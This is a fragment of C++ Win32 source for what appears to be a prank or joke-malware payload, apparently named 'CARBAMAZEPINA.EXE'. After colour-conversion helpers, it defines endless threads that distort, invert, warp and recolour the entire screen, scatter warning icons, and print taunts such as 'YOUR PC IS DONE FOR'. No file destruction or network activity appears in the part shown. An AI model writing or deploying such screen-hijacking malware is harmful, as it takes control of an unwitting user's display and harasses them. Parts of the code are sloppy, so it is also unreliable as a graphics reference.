    else if (hsl.h < 300) { r = x; g = 0; b = c; }
    else { r = c; g = 0; b = x; }

    RGBQUAD q;
    q.rgbRed = (BYTE)((r + m) * 255);
    q.rgbGreen = (BYTE)((g + m) * 255);
    q.rgbBlue = (BYTE)((b + m) * 255);
    q.rgbReserved = 0;
    return q;
}
typedef struct { float h, s, v; } HSV;

HSV RGBtoHSV(BYTE r, BYTE g, BYTE b) {
    float R = r / 255.0f, G = g / 255.0f, B = b / 255.0f;
    float cmax = max(R, max(G, B));
    float cmin = min(R, min(G, B));
    float delta = cmax - cmin;
    HSV hsv = { 0, 0, cmax };

    if (delta > 0) {
        if (cmax == R)
            hsv.h = fmodf((G - B) / delta, 6.0f);
        else if (cmax == G)
            hsv.h = ((B - R) / delta) + 2.0f;
        else
            hsv.h = ((R - G) / delta) + 4.0f;

        hsv.h *= 60;
        if (hsv.h < 0) hsv.h += 360;
        hsv.s = cmax == 0 ? 0 : delta / cmax;
    }
    return hsv;
}

void HSVtoRGB(HSV hsv, BYTE& r, BYTE& g, BYTE& b) {
    float C = hsv.v * hsv.s;
    float X = C * (1 - fabsf(fmodf(hsv.h / 60.0f, 2) - 1));
    float m = hsv.v - C;
    float R, G, B;

    if (hsv.h < 60) { R = C; G = X; B = 0; }
    else if (hsv.h < 120) { R = X; G = C; B = 0; }
    else if (hsv.h < 180) { R = 0; G = C; B = X; }
    else if (hsv.h < 240) { R = 0; G = X; B = C; }
    else if (hsv.h < 300) { R = X; G = 0; B = C; }
    else { R = C; G = 0; B = X; }

    r = (BYTE)((R + m) * 255);
    g = (BYTE)((G + m) * 255);
    b = (BYTE)((B + m) * 255);
}

HSL RGBToHSL(RGBQUAD c) {
    float r = c.rgbRed / 255.0f;
    float g = c.rgbGreen / 255.0f;
    float b = c.rgbBlue / 255.0f;
    float max = fmaxf(r, fmaxf(g, b));
    float min = fminf(r, fminf(g, b));
    float h = 0, s, l = (max + min) / 2;
    float d = max - min;

    if (d == 0) h = 0;
    else if (max == r) h = fmodf(((g - b) / d), 6.0f);
    else if (max == g) h = ((b - r) / d) + 2.0f;
    else h = ((r - g) / d) + 4.0f;

    h *= 60.0f; if (h < 0) h += 360.0f;
    s = (d == 0) ? 0 : d / (1 - fabsf(2 * l - 1));

    return { h, s, l };
}
RGBQUAD HSLToRGB5(HSL hsl) {
    float c = (1 - fabsf(2 * hsl.l - 1)) * hsl.s;
    float x = c * (1 - fabsf(fmodf(hsl.h / 60.0f, 2) - 1));
    float m = hsl.l - c / 2;
    float r = 0, g = 0, b = 0;

    if (hsl.h < 60) { r = c; g = x; }
    else if (hsl.h < 120) { r = x; g = c; }
    else if (hsl.h < 180) { g = c; b = x; }
    else if (hsl.h < 240) { g = x; b = c; }
    else if (hsl.h < 300) { r = x; b = c; }
    else { r = c; b = x; }

    RGBQUAD rgb;
    rgb.rgbRed = (BYTE)((r + m) * 255);
    rgb.rgbGreen = (BYTE)((g + m) * 255);
    rgb.rgbBlue = (BYTE)((b + m) * 255);
    rgb.rgbReserved = 0;
    return rgb;
}
HSL RGBToHSL6(COLORREF rgb) {
    float r = GetRValue(rgb) / 255.0f;
    float g = GetGValue(rgb) / 255.0f;
    float b = GetBValue(rgb) / 255.0f;
    float max = fmaxf(r, fmaxf(g, b)), min = fminf(r, fminf(g, b));
    float h = 0, s, l = (max + min) / 2.0f;
    float d = max - min;

    if (d == 0) h = 0;
    else if (max == r) h = fmodf((g - b) / d, 6.0f);
    else if (max == g) h = ((b - r) / d) + 2;
    else h = ((r - g) / d) + 4;

    h *= 60.0f;
    if (h < 0) h += 360.0f;

    s = (l == 0 || l == 1) ? 0 : d / (1 - fabsf(2 * l - 1));
    return { h, s, l };
}
COLORREF HSLToRGB6(HSL hsl) {
    float c = (1 - fabsf(2 * hsl.l - 1)) * hsl.s;
    float x = c * (1 - fabsf(fmodf(hsl.h / 60.0f, 2) - 1));
    float m = hsl.l - c / 2;
    float r, g, b;

    if (hsl.h < 60) { r = c; g = x; b = 0; }
    else if (hsl.h < 120) { r = x; g = c; b = 0; }
    else if (hsl.h < 180) { r = 0; g = c; b = x; }
    else if (hsl.h < 240) { r = 0; g = x; b = c; }
    else if (hsl.h < 300) { r = x; g = 0; b = c; }
    else { r = c; g = 0; b = x; }

    return RGB((r + m) * 255, (g + m) * 255, (b + m) * 255);
}
HSL RGBToHSL7(COLORREF rgb) {
    float r = GetRValue(rgb) / 255.0f;
    float g = GetGValue(rgb) / 255.0f;
    float b = GetBValue(rgb) / 255.0f;
    float max = fmaxf(r, fmaxf(g, b)), min = fminf(r, fminf(g, b));
    float h = 0, s, l = (max + min) / 2.0f;
    float d = max - min;

    if (d != 0) {
        if (max == r) h = fmodf((g - b) / d, 6.0f);
        else if (max == g) h = ((b - r) / d) + 2;
        else h = ((r - g) / d) + 4;
        h *= 60;
        if (h < 0) h += 360;
        s = d / (1 - fabsf(2 * l - 1));
    }
    else {
        s = 0;
    }

    return { h, s, l };
}

COLORREF HSLToRGB7(HSL hsl) {
    float c = (1 - fabsf(2 * hsl.l - 1)) * hsl.s;
    float x = c * (1 - fabsf(fmodf(hsl.h / 60.0f, 2) - 1));
    float m = hsl.l - c / 2;
    float r, g, b;

    if (hsl.h < 60) { r = c; g = x; b = 0; }
    else if (hsl.h < 120) { r = x; g = c; b = 0; }
    else if (hsl.h < 180) { r = 0; g = c; b = x; }
    else if (hsl.h < 240) { r = 0; g = x; b = c; }
    else if (hsl.h < 300) { r = x; g = 0; b = c; }
    else { r = c; g = 0; b = x; }

    return RGB((r + m) * 255, (g + m) * 255, (b + m) * 255);
}
HSL RGBToHSL8(BYTE r, BYTE g, BYTE b) {
    float fr = r / 255.f, fg = g / 255.f, fb = b / 255.f;
    float maxv = max(fr, max(fg, fb));
    float minv = min(fr, min(fg, fb));
    float h = 0, s = 0, l = (maxv + minv) / 2.f;
    if (maxv != minv) {
        float d = maxv - minv;
        s = l > 0.5f ? d / (2.f - maxv - minv) : d / (maxv + minv);
        if (maxv == fr) h = (fg - fb) / d + (fg < fb ? 6.f : 0.f);
        else if (maxv == fg) h = (fb - fr) / d + 2.f;
        else h = (fr - fg) / d + 4.f;
        h *= 60.f;
    }
    return { h, s, l };
}

COLORREF HSLToRGB8(HSL hsl) {
    float r, g, b;
    float h = hsl.h / 360.f;
    float s = hsl.s, l = hsl.l;

    auto hue2rgb = [](float p, float q, float t) {
        if (t < 0.f) t += 1.f;
        if (t > 1.f) t -= 1.f;
        if (t < 1.f / 6.f) return p + (q - p) * 6.f * t;
        if (t < 1.f / 2.f) return q;
        if (t < 2.f / 3.f) return p + (q - p) * (2.f / 3.f - t) * 6.f;
        return p;
        };

    if (s == 0.f) r = g = b = l;
    else {
        float q = l < 0.5f ? l * (1.f + s) : l + s - l * s;
        float p = 2.f * l - q;
        r = hue2rgb(p, q, h + 1.f / 3.f);
        g = hue2rgb(p, q, h);
        b = hue2rgb(p, q, h - 1.f / 3.f);
    }
    return RGB((BYTE)(r * 255), (BYTE)(g * 255), (BYTE)(b * 255));
}
DWORD WINAPI GDI1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        //BitBlt(hdc, -30, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 20, 0, w, h, hdc, 0, 20, 0x1900ac010e);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCERASE);
        //BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, 0x1900ac010e);
        //BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
        //BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI GDI2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w / 4;
    int hs = h / 4;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCPAINT);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                int fx = ((zx + i) - (zy + i)) / 1000000;

                rgbquad[index].rgbRed += (fx + 0.0);
                rgbquad[index].rgbGreen -= (fx + 90.0);
                rgbquad[index].rgbBlue += (fx + 90.0);
            }
        }

        i++; angle += 0.1f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCINVERT);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI GDI3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), w, -h, 1, 32, BI_RGB };
    RGBQUAD* pixels = NULL;
    HBITMAP bmp = CreateDIBSection(memDC, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
    SelectObject(memDC, bmp);

    int t = 0;
    while (true) {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int idx = y * w + x;
                float fx = x - w / 8.0f;
                float fy = y - h / 8.0f;
                float dist = sqrtf(fx * fx + fy * fy);
                float angle = atan2f(fy, fx);
                float wave = sinf(dist / 80.0f + t * 0.09f + angle * 5.0f) * 0.08f;

                HSL hsl = RGBtoHSL(RGB(pixels[idx].rgbRed, pixels[idx].rgbGreen, pixels[idx].rgbBlue));
                hsl.h = fmodf(hsl.h + wave + t * 0.008f, 5.f);
                pixels[idx] = RGBQUAD{ (BYTE)GetBValue(HSLtoRGB(hsl)), (BYTE)GetGValue(HSLtoRGB(hsl)), (BYTE)GetRValue(HSLtoRGB(hsl)), 0 };
            }
        }

        BitBlt(hdc, 0, 0, w, h, memDC, 0, 0, SRCCOPY);
        t++;
    }

    DeleteDC(memDC);
    DeleteObject(bmp);
    ReleaseDC(NULL, hdc);
    return 0;
}
DWORD WINAPI GDI4(LPVOID lpParam) {
    HDC screen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC memDC = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    SelectObject(memDC, bmp);

    float t = 0;

    while (true) {
        BitBlt(memDC, 0, 0, w, h, screen, 0, 0, SRCCOPY);

        for (int y = 0; y < h; y += 40) {
            for (int x = 0; x < w; x += 40) {
                float waveX = sinf((x + t * 1) * 0.03f) * 6;
                float waveY = cosf((y + t * 1) * 0.03f) * 6;

                int srcX = (x + (int)waveX + w) % w;
                int srcY = (y + (int)waveY + h) % h;

                StretchBlt(
                    screen,
                    x, y, -64, -64,
                    memDC,
                    srcX, srcY, -65, -65,
                    SRCCOPY
                );
            }
        }

        t += 0.25f;
    }

    DeleteObject(bmp);
    DeleteDC(memDC);
    ReleaseDC(NULL, screen);
    return 0;
}
DWORD WINAPI GDI5(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC screen = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(screen);
    HBITMAP memBM = CreateCompatibleBitmap(screen, w, h);
    HBITMAP oldBM = (HBITMAP)SelectObject(memDC, memBM);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    DWORD* pixels = new DWORD[w * h];

    while (true) {
        BitBlt(memDC, 0, 0, w, h, screen, 0, 0, SRCCOPY);
        GetDIBits(memDC, memBM, 0, h, pixels, &bmi, DIB_RGB_COLORS);

        float t = GetTickCount() * 0.002f;

        DWORD* warped = new DWORD[w * h];

        for (int y = 0; y < h; y++) {
            float offsetX = sinf(y * 0.02f + t) * 92;
            for (int x = 0; x < w; x++) {
                float offsetY = sinf(x * 0.04f + t * 1.3f) * 92;

                int sx = (int)(x + offsetX);
                int sy = (int)(y + offsetY);

                if (sx < 0) sx += w;
                if (sy < 0) sy += h;
                if (sx >= w) sx -= w;
                if (sy >= h) sy -= h;

                int i = sy * w + sx;
                if (i >= 0 && i < w * h) {
                    warped[y * w + x] = ShiftHue(pixels[i], sinf(t + x * 0.901f + y * 0.901f) * 0.51f);
                }
            }
        }

        SetDIBits(memDC, memBM, 0, h, warped, &bmi, DIB_RGB_COLORS);
        BitBlt(screen, 0, 0, w, h, memDC, 0, 0, SRCCOPY);

        delete[] warped;
    }

    delete[] pixels;
    SelectObject(memDC, oldBM);
    DeleteObject(memBM);
    DeleteDC(memDC);
    ReleaseDC(NULL, screen);
    return 0;
}
DWORD WINAPI SQUARES1(LPVOID)
{
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            HDC hdcCopy = CreateCompatibleDC(hdc);

            INT nBlockSize = rand() % 129 + 128;
            INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

            INT x = rand() % (w - nBlockSize);
            INT y = rand() % (h - nBlockSize);

            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 1, y - (nNewBlockSize - nBlockSize) / 1, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, SRCINVERT);
            StretchBlt(hdcCopy, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, SRCPAINT);
            BLENDFUNCTION blend = { 0, 0, 50, 0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        }
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI SQUARES2(LPVOID)
{
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            HDC hdcCopy = CreateCompatibleDC(hdc);

            INT nBlockSize = rand() % 129 + 128;
            INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

            INT x = rand() % (w - nBlockSize);
            INT y = rand() % (h - nBlockSize);

            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 1, y - (nNewBlockSize - nBlockSize) / 1, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, NOTSRCCOPY);
            StretchBlt(hdcCopy, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, SRCERASE);
            BLENDFUNCTION blend = { 0, 0, 50, 0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        }
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI GDI6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w / 1;
    int hs = h / 1;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCPAINT);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));

                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                int fx = ((zx + i) - (zy + i)) / 1000000;

                rgbquad[index].rgbRed += (fx + 00.0);
                rgbquad[index].rgbGreen -= (fx + 400.0);
                rgbquad[index].rgbBlue += (fx + 500.0);
            }
        }

        i++; angle += 0.1f;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
        SelectObject(hdc, brush);
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, NOTSRCCOPY);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, PATINVERT);
        ReleaseDC(NULL, hdc);
        DeleteObject(brush);
        DeleteDC(hdc);
    }
}
DWORD WINAPI ICON(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    HDC screenDC = GetDC(0);
    HDC memDC = CreateCompatibleDC(screenDC);

    HBITMAP memBmp = CreateCompatibleBitmap(screenDC, width, height);
    SelectObject(memDC, memBmp);

    float angle = 0.0f;
    while (true) {
        screenDC = GetDC(0);

        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        SelectObject(screenDC, brush);

        BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

        DrawIcon(screenDC, rand() % width, rand() % height, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(screenDC, rand() % width, rand() % height, LoadIcon(NULL, IDI_ERROR));
        DrawIcon(screenDC, rand() % width, rand() % height, LoadIcon(NULL, IDI_INFORMATION));
        DrawIcon(screenDC, rand() % width, rand() % height, LoadIcon(NULL, IDI_QUESTION));
        DeleteObject(brush);
        ReleaseDC(0, screenDC);
        DeleteDC(screenDC);
    }
    return 0;
}
DWORD WINAPI TEXTOUTS1(LPVOID lpParam) {
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = 0;
    LPCSTR text5 = 0;
    LPCSTR text6 = 0;
    LPCSTR text7 = 0;
    LPCSTR text8 = 0;
    LPCSTR text9 = 0;
    LPCSTR text10 = 0;
    LPCSTR text11 = 0;
    LPCSTR text12 = 0;
    LPCSTR text13 = 0;

    while (1)
    {
        HDC hdc = GetDC(0);
        text1 = "CARBAMAZEPINA.EXE";
        text2 = "ULTRADASHER965";
        text3 = "TELEPATHII";
        text4 = "NUMBER333";
        text5 = "EXECUTIONER";
        text6 = "SIXTYFOURYT";
        text7 = "BRUNITOGV10";
        text8 = "CHRISRM380";
        text9 = "YOUR PC IS DONE FOR";
        text10 = "THERE IS NO MEAN";
        text11 = "YOU SHOULD GO THINK YOUR LIFE DECISIONS";
        text12 = "YOU STUPID IDIOT";
        text13 = "carbamazepina is a skidder done";

        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

        HFONT font1 = CreateFontA(20, 14, rand() % 3600, rand() % 360, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
        SelectObject(hdc, font1);

        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
        TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
        TextOutA(hdc, rand() % x, rand() % y, text7, strlen(text7));
        TextOutA(hdc, rand() % x, rand() % y, text8, strlen(text8));
        TextOutA(hdc, rand() % x, rand() % y, text9, strlen(text9));
        TextOutA(hdc, rand() % x, rand() % y, text10, strlen(text10));
        TextOutA(hdc, rand() % x, rand() % y, text11, strlen(text11));
        TextOutA(hdc, rand() % x, rand() % y, text10, strlen(text12));
        TextOutA(hdc, rand() % x, rand() % y, text11, strlen(text13));

        DeleteObject(font1);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
DWORD WINAPI POSTGDI1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);

        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI GDI7(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }

    return 0x00;
}
DWORD WINAPI POSTGDI2(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI GDI8(LPVOID lpParam) {
    int ticks = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 1;; i++, i %= 21) {
        if (!i) for (int c = 0; c < 100; c++) InvalidateRect(0, 0, 0);
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0; BYTE bt = 0;
        if ((GetTickCount() - ticks) > 60000)
            bt = 2 + rand() & 255;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
                v = 3 + rand() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + bt))[bt] ^ i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
    }
}
DWORD WINAPI GDI9(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = ((x + i) - (y + i)) / 1000000;

                rgbquad[index].rgbRed += (fx + 10.0);
                rgbquad[index].rgbGreen += (fx + 10.0);
                rgbquad[index].rgbBlue += (fx + 10.0);
            }
        }

        i++;
        BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 00, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, -h + 00, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}
DWORD WINAPI GDI10(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = ((x + i) - (y + i)) / 1000000;

                rgbquad[index].rgbRed += (fx + 10.0);
                rgbquad[index].rgbGreen += (fx + 100.0);
                rgbquad[index].rgbBlue += (fx + 100.0);
            }
        }

        i++;
        BitBlt(hdc, 0, 0, w, h, hdcCopy, 4, 60, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdcCopy, 4, -h + 60, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}
